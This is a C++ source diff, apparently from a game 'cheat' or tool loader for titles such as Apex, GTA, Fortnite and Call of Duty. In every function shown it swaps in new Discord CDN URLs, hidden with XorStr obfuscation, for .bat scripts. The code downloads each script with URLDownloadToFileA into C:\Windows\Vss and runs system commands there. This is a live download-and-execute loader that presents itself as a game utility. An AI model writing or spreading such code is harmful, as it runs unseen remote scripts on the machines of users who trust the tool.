@@ -18,7 +18,7 @@ void apex()
 {
 
     akfuxnl();
-    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746005178921010/apex.bat"));
+    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
     std::string apexpath = "C:\\Windows\Vss\Apex.bat";
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
@@ -33,7 +33,7 @@ void gta()
     
 
     akfuxnl();
-    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746003085959278/gta.bat"));
+    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = "C:\\Windows\Vss\gta.bat";
     URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
@@ -46,7 +46,7 @@ void fortnite()
     
 
     akfuxnl();
-    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746001928323092/Fortnite.bat"));
+    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\Vss\Fortnite.bat";
     URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
@@ -58,7 +58,7 @@ void fishingplanet()
     
 
     akfuxnl();
-    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879746000506478592/fishing-planet.bat"));
+    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\Vss\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
@@ -71,7 +71,7 @@ void cod()
     
 
     akfuxnl();
-    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745997213950052/Cold-Ware.bat"));
+    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = "C:\\Windows\Vss\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
